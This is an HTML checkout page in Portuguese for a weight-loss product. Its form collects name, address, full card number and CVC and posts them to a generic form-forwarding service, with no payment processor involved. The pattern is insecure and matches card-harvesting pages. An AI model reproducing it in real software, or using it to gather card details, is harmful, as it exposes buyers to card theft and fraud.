
<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Checkout - Emagrecimento</title>
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Playfair Display', serif;
      background-color: #f5f5f5;
      padding: 40px;
    }
    .container {
      max-width: 600px;
      margin: auto;
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
    }
    h1 {
      color: #0077b6;
      text-align: center;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 15px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #0077b6;
      color: white;
      border: none;
      border-radius: 6px;
      margin-top: 20px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background: #005f87;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Finalizar Compra</h1>
    <form action="https://formspree.io/f/xwplaaqz" method="POST">
      <input type="text" name="nome" placeholder="Nome completo" required>
      <input type="email" name="email" placeholder="Seu melhor e-mail" required>
      <input type="text" name="endereco" placeholder="Endereço completo" required>
      <select name="metodo_pagamento" required>
        <option value="">Escolha o método de pagamento</option>
        <option value="pix">PIX</option>
        <option value="credito">Cartão de Crédito</option>
        <option value="debito">Cartão de Débito</option>
      </select>
      <input type="text" name="nome_cartao" placeholder="Nome impresso no cartão">
      <input type="text" name="numero_cartao" placeholder="Número do cartão">
      <input type="text" name="cvc" placeholder="CVC">
      <button type="submit">Concluir Compra</button>
    </form>
  </div>
</body>
</html>
